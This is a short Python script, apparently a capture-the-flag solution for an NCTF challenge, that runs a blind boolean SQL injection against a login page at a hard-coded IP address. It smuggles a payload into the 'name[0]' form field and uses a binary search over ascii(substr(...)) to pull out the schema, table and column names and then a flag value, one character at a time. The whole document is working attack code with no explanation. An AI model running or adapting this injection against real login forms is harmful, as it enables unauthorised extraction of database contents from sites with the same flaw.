import requests

rst = ""
url = "http://129.211.173.64:3080/login.php"
# sql = "database()"
# sql = "(select group_concat(table_name) from information_schema.tables where table_schema regexp 0x32303231)"
# sql = "(select group_concat(column_name) from information_schema.columns where table_name regexp 0x4e635446)"
sql = "(select group_concat(`fl@g`) from NcTF)"
for i in range(1, 100):
    low = 32
    high = 127
    while low < high:
        mid = (low + high) // 2
        data = {
            "password": "%s",
            "name[0]": f") or (ascii(substr({sql},{i},1))>{mid})#",
            "name[1]": "2"
        }
        rsp = requests.post(url=url, data=data)
        if "NCTF" in rsp.text:
            low = mid + 1
            #print(rsp.text)
        else:
            high = mid
    rst += chr(high)
    print(rst)